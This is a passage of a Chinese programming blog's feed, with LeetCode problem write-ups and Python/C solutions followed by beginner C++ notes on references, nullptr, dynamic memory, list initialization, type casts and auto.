root-&gt;left-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;left-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>        ret += root-&gt;left-&gt;val;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sumOfLeftLeaves(root-&gt;left)+sumOfLeftLeaves(root-&gt;right)+ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-拼写单词"><a href="#5-拼写单词" class="headerlink" title="5.拼写单词"></a>5.拼写单词</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>给你一份『词汇表』（字符串数组） words 和一张『字母表』（字符串） chars。</p><p>假如你可以用 chars 中的『字母』（字符）拼写出 words 中的某个『单词』（字符串），那么我们就认为你掌握了这个单词。</p><p>注意：每次拼写时，chars 中的每个字母都只能用一次。</p><p>返回词汇表 words 中你掌握的所有单词的 <strong>长度之和</strong>。</p><p><strong>示例：</strong></p><p>输入：words &#x3D; [“cat”,”bt”,”hat”,”tree”], chars &#x3D; “atach”<br>输出：6<br>解释：可以形成字符串 “cat” 和 “hat”，所以答案是 3 + 3 &#x3D; 6。</p><h3 id="5-2思路分析"><a href="#5-2思路分析" class="headerlink" title="5.2思路分析"></a>5.2思路分析</h3><p>本题使用python解答很简单，只需要判定单词列表中的每个字母数量是否小于等于给定的字符串中的即可，使用字符串的count()方法即可</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">countCharacters</span>(<span class="hljs-params">self, words: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], chars: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> words:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w:<br>                <span class="hljs-keyword">if</span> w.count(i) &lt;= chars.count(i):<br>                    flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>                result += <span class="hljs-built_in">len</span>(w)<br>        <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h2 id="6-优美的排列"><a href="#6-优美的排列" class="headerlink" title="6.优美的排列"></a>6.优美的排列</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>给定两个整数 n 和 k，你需要实现一个数组，这个数组包含从 1 到 n 的 n 个不同整数，同时满足以下条件：</p><p>① 如果这个数组是 [a1, a2, a3, … , an] ，那么数组 [|a1 - a2|, |a2 - a3|, |a3 - a4|, … , |an-1 - an|] 中应该有且仅有 k 个不同整数；.</p><p>② 如果存在多种答案，你只需实现并返回其中任意一种.<br>题目链接：<a href="https://leetcode-cn.com/problems/beautiful-arrangement-ii">https://leetcode-cn.com/problems/beautiful-arrangement-ii</a></p><h3 id="6-2思路分析"><a href="#6-2思路分析" class="headerlink" title="6.2思路分析"></a>6.2思路分析</h3><p>找规律即可，下标段[0, k]中，偶数下标填充[1,2,3..]，下标段[0, k]中，奇数下标填充[k + 1, k, k - 1…]，下标段[k + 1, n - 1]都是顺序填充。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note: The returned array must be malloced, assume caller calls free().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span>* <span class="hljs-title function_">constructArray</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span>* returnSize)</span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    returnSize = (<span class="hljs-type">int</span>* )<span class="hljs-built_in">malloc</span>(n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-type">int</span> numK = k + <span class="hljs-number">1</span>, numTemp = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//下标段[0, k]中，偶数下标填充[1,2,3..]</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= k; i += <span class="hljs-number">2</span>)&#123;<br>        returnSize[i] = numTemp++;<br>    &#125;<br>    <span class="hljs-comment">//下标段[0, k]中，奇数下标填充[k + 1, k, k - 1...]</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= k; i += <span class="hljs-number">2</span>)&#123;<br>        returnSize[i] = numK--;<br>    &#125;<br>    <span class="hljs-comment">//下标段[k + 1, n - 1]都是顺序填充</span><br><span class="hljs-keyword">for</span> (i = k + <span class="hljs-number">1</span>; i &lt; n; ++i) &#123;<br>returnSize[i] = i + <span class="hljs-number">1</span>;<br>&#125;<br>    <span class="hljs-keyword">return</span> returnSize;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span>* returnSize;<br><span class="hljs-type">int</span> n,k,i;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);<br>returnSize=constructArray(n,k,returnSize);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; n;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,returnSize[i]);<br>&#125;<br><span class="hljs-built_in">free</span>(returnSize);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>自己运行的结果是对的，但是oj平台一直显示溢出，不知道啥原因，内存分配和访问都没问题啊，蜜汁操作。</p><h2 id="7-旋转数字"><a href="#7-旋转数字" class="headerlink" title="7.旋转数字"></a>7.旋转数字</h2><h3 id="7-1题目描述"><a href="#7-1题目描述" class="headerlink" title="7.1题目描述"></a>7.1题目描述</h3><p>我们称一个数 X 为好数, 如果它的每位数字逐个地被旋转 180 度后，我们仍可以得到一个有效的，且和 X 不同的数。要求每位数字都要被旋转。</p><p>如果一个数的每位数字被旋转以后仍然还是一个数字， 则这个数是有效的。0, 1, 和 8 被旋转后仍然是它们自己；2 和 5 可以互相旋转成对方；6 和 9 同理，除了这些以外其他的数字旋转以后都不再是有效的数字。</p><p>现在我们有一个正整数 N, 计算从 1 到 N 中有多少个数 X 是好数？</p><p><strong>示例:</strong><br>输入: 10<br>输出: 4<br>解释:<br>在[1, 10]中有四个好数： 2, 5, 6, 9。<br>注意 1 和 10 不是好数, 因为他们在旋转之后不变。</p><p>来源：<a href="https://leetcode-cn.com/problems/rotated-digits">https://leetcode-cn.com/problems/rotated-digits</a></p><h3 id="7-2思路分析"><a href="#7-2思路分析" class="headerlink" title="7.2思路分析"></a>7.2思路分析</h3><p>保证每位都在(2, 5, 6, 9, 0, 1, 8)内，至少一位在(2, 5, 6, 9)内即可，采用暴力破解法。</p><h3 id="7-3代码"><a href="#7-3代码" class="headerlink" title="7.3代码"></a>7.3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rotatedDigits</span>(<span class="hljs-params">self, N: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        s1 = <span class="hljs-string">&#x27;2569018&#x27;</span><br>        s2 = <span class="hljs-string">&#x27;2569&#x27;</span><br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,N+<span class="hljs-number">1</span>):<br>            flag1,flag = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>            sN = <span class="hljs-built_in">str</span>(j)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sN:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> s1 :<br>                    flag1 = <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> s2:<br>                        flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flag1 == <span class="hljs-number">1</span>:<br>                result+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h3 id="7-4最优解"><a href="#7-4最优解" class="headerlink" title="7.4最优解"></a>7.4最优解</h3><p><strong>思路</strong><br>根据好数定义，每个好数只能包含数字 0125689，并且至少包含 2569 中的一个。因此可以逐个写出小于等于 N 的所有好数。<br>这道题目可以使用动态规划解答。状态可以表示为三个变量 i, equality_flag, involution_flag。其中 i 表示当前正在写第 i 位数字；equality_flag 表示已经写出的 j 位数字是否等于 N 的 j 位前缀；involution_flag 表示从最高位到比当前位高一位的这段前缀中是否含有 2569 中的任意一个数字。<br>dp(i, equality_flag, involution_flag) 表示在特定 equality_flag，involution_flag 的状态下，有多少种从 i 到末尾的后缀能组成一个好数。最终的结果为 dp(0, True, False)。<br>注：数字 N 从最高位到最低位的索引，从 0 开始，并依次增大。第 i 位表示索引为 i 的位置。<br><strong>算法</strong><br>如果 equality_flag 为 true，表示第 i 位能取到的最大数字为 N 的第 i 位对应的数字。并且还需要根据当前状态决定可以写哪些数字。<br>在代码实现中，我们分别使用了自顶向下的方法和自底向上的方式。Python 代码实现的是自顶向下的方法，从 for d in xrange(…) 到 memo[…] &#x3D; ans 这四行代码清晰的说明了状态之间的递归关系。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rotatedDigits</span>(<span class="hljs-params">self, N</span>):<br>        A = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>(N))<br><br>        memo = &#123;&#125;<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i, equality_flag, involution_flag</span>):<br>            <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(A): <span class="hljs-keyword">return</span> +(involution_flag)<br>            <span class="hljs-keyword">if</span> (i, equality_flag, involution_flag) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> memo:<br>                ans = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> xrange(A[i] + <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> equality_flag <span class="hljs-keyword">else</span> <span class="hljs-number">10</span>):<br>                    <span class="hljs-keyword">if</span> d <span class="hljs-keyword">in</span> &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;: <span class="hljs-keyword">continue</span><br>                    ans += dp(i+<span class="hljs-number">1</span>, equality_flag <span class="hljs-keyword">and</span> d == A[i],<br>                              involution_flag <span class="hljs-keyword">or</span> d <span class="hljs-keyword">in</span> &#123;<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>&#125;)<br>                memo[i, equality_flag, involution_flag] = ans<br>            <span class="hljs-keyword">return</span> memo[i, equality_flag, involution_flag]<br><br>        <span class="hljs-keyword">return</span> dp(<span class="hljs-number">0</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++学习笔记1</title>
    <link href="/blog/2020/02/20/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/blog/2020/02/20/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<p><strong>继续本周的C++学习任务。</strong></p><p><img src="/images/fj31.jpg"></p><span id="more"></span><h1 id="C语法的增强及对应的C-特性"><a href="#C语法的增强及对应的C-特性" class="headerlink" title="C语法的增强及对应的C++特性"></a>C语法的增强及对应的C++特性</h1><h2 id="引用、-C-11-空指针与动态内存分配"><a href="#引用、-C-11-空指针与动态内存分配" class="headerlink" title="引用、[C++11]空指针与动态内存分配"></a>引用、[C++11]空指针与动态内存分配</h2><h3 id="引用Reference"><a href="#引用Reference" class="headerlink" title="引用Reference"></a>引用Reference</h3><p>引用就是另一个变量的别名，通过引用所做的读写操作实际上是作用于原变量上。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span>&amp; rx=x;<br></code></pre></td></tr></table></figure><p>C++指针与引用符号应靠近其类型名而非名字。</p><p>引用可以作为函数参数，但调用时只需要传递普通变量即可。在被调用函数中改变引用变量的值，则改变的是实际参数的值。</p><h3 id="空指针和动态内存分配"><a href="#空指针和动态内存分配" class="headerlink" title="空指针和动态内存分配"></a>空指针和动态内存分配</h3><p>1.空指针</p><p>1.1 0带来的二义性问题</p><ol><li>C++03中，空指针使用“0”来表示。0既是一个常量整数，也是一个常量空指针。</li><li>C语言中，空指针使用(void *)0来表示</li><li>有时候，用“NULL”来表示空指针(一种可能的实现方式是#define NULL  0)</li></ol><p>1.2 C++标准化委员会希望“空指针”是一个确定的东西。<br>C++11中引入保留字“nullptr”作为空指针</p><p>2.动态内存管理：分配&#x2F;释放</p><p>2.1     C++中通过运算符new申请动态内存</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">new</span>  &lt;类型名&gt; (初值) ;     <span class="hljs-comment">//申请一个变量的空间</span><br><span class="hljs-keyword">new</span>  &lt;类型名&gt;[常量表达式] ;   <span class="hljs-comment">//申请数组</span><br></code></pre></td></tr></table></figure><p>如果申请成功，返回指定类型内存的地址；<br>如果申请失败，抛出异常，或者返回空指针(nullptr)。(C++11)</p><p>2.2.       动态内存使用完毕后，要用delete运算符来释放。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">delete</span>   &lt;指针名&gt;;    <span class="hljs-comment">//删除一个变量/对象</span><br><span class="hljs-keyword">delete</span> []  &lt;指针名&gt;;     <span class="hljs-comment">//删除数组空间</span><br></code></pre></td></tr></table></figure><h2 id="数据类型与转换、列表初始化"><a href="#数据类型与转换、列表初始化" class="headerlink" title="数据类型与转换、列表初始化"></a>数据类型与转换、列表初始化</h2><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>逻辑运算符和C语言基本一致</p><p>注：编码规范：布尔变量&#x2F;函数的命名应使用前缀“is”，断行必须很明显，在逗号或运算符后换行，新行要对齐</p><h3 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h3><p>列表初始化是C++11的一个新特性，“列表”是用花括号括起来的一(些)值。</p><p>列表初始化分为两类：</p><ul><li>直接列表初始化</li><li>拷贝列表初始化</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//直接列表初始化)</span><br><span class="hljs-comment">/* Variable initialization */</span> <br><span class="hljs-type">int</span> x&#123;&#125;; <span class="hljs-comment">// x is 0; </span><br><span class="hljs-type">int</span> y&#123; <span class="hljs-number">1</span> &#125;; <span class="hljs-comment">// y is 1; </span><br><span class="hljs-comment">/* Array initialization */</span> <br><span class="hljs-type">int</span> array1[]&#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> &#125;; <br><span class="hljs-type">char</span> s1[ <span class="hljs-number">3</span> ] &#123; <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span> &#125;; <br><span class="hljs-type">char</span> s3[]&#123; <span class="hljs-string">&quot;Hello&quot;</span> &#125;; <br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//拷贝列表初始化</span><br><span class="hljs-comment">/* Variable initialization */</span> <br><span class="hljs-type">int</span> z = &#123; <span class="hljs-number">2</span> &#125;; <br><span class="hljs-comment">/* Array initialization */</span> <br><span class="hljs-type">int</span> array2[] = &#123; <span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> &#125;; <br><span class="hljs-type">char</span> s2[] = &#123; <span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span> &#125;; <br><span class="hljs-type">char</span> s4[] = &#123; <span class="hljs-string">&quot;World&quot;</span> &#125;;<br><span class="hljs-type">char</span> s5[] = <span class="hljs-string">&quot;Aloha&quot;</span>; <span class="hljs-comment">// Omit curly braces (省略花括号)</span><br></code></pre></td></tr></table></figure><p>尽量使用列表初始化，列表初始化不允许丢失数据精度的隐式类型转换。</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>类型转换有两种：</p><p><strong>1.隐式类型转换</strong></p><ul><li>由编译器按照数据类型的转换规则自动转换，无需程序员干预。</li><li>可能导致数据精度损失，或者转换失败。</li><li>应尽量避免使用隐式类型转换</li></ul><p><strong>2 显式类型转换（即：强制类型转换）</strong></p><ul><li>由程序员用明确的类型转换语法写出类型转换代码。</li><li>好处是，程序员知道自己要做什么并且把这个想法明确表达出来。</li></ul><p>C++风格强制类型转换：<strong>语法：static_cast<type> value</strong></p><p>编码规范：类型转换必须显式声明，永远不要依赖隐式类型转换。</p><h2 id="自动类型推导：类型系统、auto与decltype"><a href="#自动类型推导：类型系统、auto与decltype" class="headerlink" title="自动类型推导：类型系统、auto与decltype"></a>自动类型推导：类型系统、auto与decltype</h2><p><strong>静态类型 v.s. 动态类型：</strong></p><p>程序设计语言的类型系统机制会检查连接在一起的多个块的一致性</p><p>上述检查若发生在编译期，称为静态类型<br>上述检查若发生在运行时，称为动态类型<br>上述检查若同时存在于编译期和运行时，称为混合类型</p><h3 id="自动类型推导：auto关键字"><a href="#自动类型推导：auto关键字" class="headerlink" title="自动类型推导：auto关键字"></a>自动类型推导：auto关键字</h3><h4 id="1-关键字auto"><a href="#1-关键字auto" class="headerlink" title="1.关键字auto"></a>1.关键字auto</h4><p>C++11中，auto关键字放在变量之前，作用是在声明变量的时候根据变量初始值的类型自动为此变量选择匹配的类型。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">auto</span> au_a = a;<br>cout &lt;&lt; <span class="hljs-built_in">typeid</span>(au_a).<span class="hljs-built_in">name</span>()endl;<br></code></pre></td></tr></table></figure><h4 id="2-auto的使用限制"><a href="#2-auto的使用限制" class="headerlink" title="2.auto的使用限制"></a>2.auto的使用限制</h4><p>1.auto 变量必须在定义时初始化，这类似于const关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> a1 = <span class="hljs-number">10</span>;  <span class="hljs-comment">//正确</span><br><span class="hljs-keyword">auto</span> b1;   <span class="hljs-comment">//错误,编译器无法推导b1的类型</span><br>b1 = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p>2.定义在一个auto序列的变量必须始终推导成同一类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> a4 = <span class="hljs-number">10</span>, a5&#123;<span class="hljs-number">20</span>&#125;;   <span class="hljs-comment">//正确 </span><br><span class="hljs-keyword">auto</span> b4&#123;<span class="hljs-number">10</span>&#125;, b5 = <span class="hljs-number">20.0</span>; <span class="hljs-comment">//错误,没有推导为同一类型</span><br></code></pre></td></tr></table></figure><p>3.如果初始化表达式是引用或const，则去除引用或const语义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a&#123;<span class="hljs-number">10</span>&#125;; <span class="hljs-type">int</span> &amp;b = a;<br><span class="hljs-keyword">auto</span> c = b;   <span class="hljs-comment">//c的类型为int而非int&amp;（去除引用）</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> a1&#123;<span class="hljs-number">10</span>&#125;;<br><span class="hljs-keyword">auto</span> b1 = a1; <span class="hljs-comment">//b1的类型为int而非const int（去除const）</span><br></code></pre></td></tr></table></figure><p>4.如果auto关键字带上&amp;号，则不去除引用或const语意</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>; <span class="hljs-type">int</span>&amp; b = a;<br><span class="hljs-keyword">auto</span>&amp; d = b;<span class="hljs-comment">//此时d的类型才为int&amp;</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> a2 = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">auto</span>&amp; b2 = a2;<span class="hljs-comment">//因为auto带上&amp;，故不去除const，b2类型为const in</span><br></code></pre></td></tr></table></figure><p>5.初始化表达式为数组时，auto关键字推导类型为指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a3[<span class="hljs-number">3</span>] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;;<br><span class="hljs-keyword">auto</span> b3 = a3;<br>cout &lt;&lt; <span class="hljs-built_in">typeid</span>(b3).<span class="hljs-built_in">name</span>() &lt;&lt; endl; <span class="hljs-comment">//输出int * （输出与编译器有关）</span><br></code></pre></td></tr></table></figure><p>6.若表达式为数组且auto带上&amp;，则推导类型为数组类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a7[<span class="hljs-number">3</span>] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;;<br><span class="hljs-keyword">auto</span>&amp; b7 = a7;<br>cout &lt;&lt; <span class="hljs-built_in">typeid</span>(b7).<span class="hljs-built_in">name</span>() &lt;&lt; endl; <span class="hljs-comment">//输出int [3] （输出与编译器有关）</span><br></code></pre></td></tr></table></figure><p>7.C++14中，auto可以作为函数的返回值类型和参数类型</p>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++学习笔记0</title>
    <link href="/blog/2020/02/10/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B00/"/>
    <url>/blog/2020/02/10/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B00/</url>
    
    <content type="html"><![CDATA[<p><strong>一直想学C++，一直没空，现在闲下来了学习下。</strong></p><p><img src="/images/fj30.jpg"></p><span id="more"></span><h2 id="0-0-C-源文件和编码规范"><a href="#0-0-C-源文件和编码规范" class="headerlink" title="0-0  C++源文件和编码规范"></a>0-0  C++源文件和编码规范</h2><h3 id="1-代码文件"><a href="#1-代码文件" class="headerlink" title="1. 代码文件"></a>1. 代码文件</h3><ul><li>world.h 是头文件</li><li>world.hpp 是头文件</li><li>world.cpp 是源文件</li><li>world.cxx 是源文件</li></ul><h3 id="2-编码规范"><a href="#2-编码规范" class="headerlink" title="2. 编码规范"></a>2. 编码规范</h3><p>为什么要使用编码规范？显然是为了让程序具有更好的可读性</p><p>谷歌开源项目风格指南：<a href="https://github.com/zh-google-styleguide/zh-google-styleguide">https://github.com/zh-google-styleguide/zh-google-styleguide</a></p><h2 id="0-1-Hello-World"><a href="#0-1-Hello-World" class="headerlink" title="0-1 Hello World"></a>0-1 Hello World</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span><span class="hljs-comment">//头文件</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;Hello World&quot;</span>&lt;&lt;std::endl;<span class="hljs-comment">//流插入操作符</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//返回值</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>不准使用制表符和分页符等特殊字符，IDE中会将制表符设置并替换为四个空格</li><li>函数的返回值必须明确列出，如果不写返回值编译器会默认为int</li></ul><h2 id="0-2-命名空间-namespace"><a href="#0-2-命名空间-namespace" class="headerlink" title="0-2 命名空间(namespace)"></a>0-2 命名空间(namespace)</h2><p>所谓namespace，是指标识符的各种可见范围。C++标准程序库中的所有标识符都被定义于一个名为std的namespace中。<br>一 ：<iostream>和&lt;iostream.h&gt;格式不一样，前者没有后缀，实际上，在你的编译器include文件夹里面可以看到，二者是两个文件，打开文件就会发现，里面的代码是不一样的。后缀为.h的头文件c++标准已经明确提出不支持了，早些的实现将标准库功能定义在全局空间里，声明在带.h后缀的头文件里，c++标准为了和C区别开，也为了正确使用命名空间，规定头文件不使用后缀.h。 因此，当使用&lt;iostream.h&gt;时，相当于在c中调用库函数，使用的是全局命名空间，也就是早期的c++实现；当使用<iostream>的时候，该头文件没有定义全局命名空间，必须使用namespace std；这样才能正确使用cout。<br>二： 由于namespace的概念，使用C++标准程序库的任何标识符时，可以有三种选择：<br>1、直接指定标识符。例如std::iostream而不是iostream。完整语句如下： std::cout &lt;&lt; std::hex &lt;&lt; 3.4 